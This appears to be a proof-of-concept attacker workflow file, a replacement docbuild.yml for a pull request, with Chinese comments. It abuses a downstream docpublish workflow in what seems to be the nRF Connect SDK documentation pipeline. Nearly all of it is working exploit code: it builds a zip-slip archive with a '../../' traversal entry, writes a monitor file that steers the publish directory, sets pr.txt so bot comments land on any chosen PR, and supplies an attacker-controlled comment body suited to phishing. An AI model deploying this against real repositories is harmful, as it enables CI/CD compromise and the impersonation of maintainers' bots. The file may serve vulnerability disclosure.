name: Documentation Build

# 攻击者 PR 分支中的 docbuild.yml
# 保持 name: 和 on: 不变，跳过真实构建，直接产出恶意 artifact
# docpublish.yml 监听的就是 "Documentation Build"，完全不需要改它
on:
  pull_request:
    types: [opened, synchronize, reopened]
    branches:
      - main
      - 'v*-branch'
    paths:
      - '.github/workflows/docbuild.yml'
      - '**.rst'
      - '**/Kconfig'
      - '**/sample.yaml'
      - 'doc/**'
      - 'applications/**'
      - 'include/**'
      - 'lib/**'
      - 'doc/requirements.txt'
      - 'scripts/tools-versions-*.yml'
      - 'west.yml'
  push:
    branches:
      - main
      - 'v*-branch'
    tags:
      - v*

jobs:
  build:
    runs-on: ubuntu-24.04
    steps:
      - name: Craft malicious artifact (replaces real doc build)
        run: |
          # artifact 目录结构必须与原 docbuild.yml Store step 匹配：
          #   ncs/nrf/*.zip
          #   ncs/nrf/monitor*.txt
          #   ncs/nrf/pr.txt
          #   ncs/nrf/comment.txt
          mkdir -p ncs/nrf

          # --- zip-slip payload ---
          # docpublish.yml L30: unzip legacy-ncs*.zip -d $OUTDIR  (unquoted, no content check)
          python3 - <<'PYEOF'
          import zipfile
          with zipfile.ZipFile('ncs/nrf/legacy-ncs-pr-${{ github.event.number }}.zip', 'w') as zf:
              zf.writestr('index.html', '<h1>normal</h1>')
              # path traversal entry: tries to land at docs/zipslip_pwned.txt
              info = zipfile.ZipInfo('../../zipslip_pwned.txt')
              zf.writestr(info, 'ZIP-SLIP written outside OUTDIR by PR #${{ github.event.number }}')
          PYEOF

          # --- monitor: 控制 docpublish OUTDIR 路径 ---
          # docpublish.yml L27: awk 取第3列 -> OUTDIR=ncs/<value>
          echo "publish2 dev PR-${{ github.event.number }} legacy-ncs-pr-${{ github.event.number }}.zip" \
            > ncs/nrf/monitor_${{ github.run_id }}.txt

          # --- pr.txt: 控制 bot 评论打到哪个 PR ---
          # docpublish.yml L37: PR=$(head -n 1 pr.txt | tr -cd '0-9')
          # 改成任意已存在的 PR 编号即可冒充任意 PR 收到 bot 评论
          echo "${{ github.event.number }}" > ncs/nrf/pr.txt

          # --- comment.txt: bot 评论正文，完全可控 ---
          # docpublish.yml L106: body-path: docs/comment.txt
          cat > ncs/nrf/comment.txt <<'COMMENT'
          ## Documentation preview

          You can find the documentation preview for this PR [here](https://ncsbmdoc.z6.web.core.windows.net/ncs/PR-${{ github.event.number }}/).

          ---
          > **[PoC note]** This comment body comes from `comment.txt` inside the build artifact.
          > In a real attack it can contain arbitrary markdown — injected links, phishing content,
          > or social engineering targeting maintainers. The `pr.txt` file could point to ANY
          > PR in the repo, not just this one.
          COMMENT

      - name: Store
        uses: actions/upload-artifact@4cec3d8aa04e39d1a68397de0c4cd6fb9dce8ec1 # v4
        with:
          name: docs
          path: |
            ncs/nrf/*.zip
            ncs/nrf/monitor*.txt
            ncs/nrf/pr.txt
            ncs/nrf/comment.txt
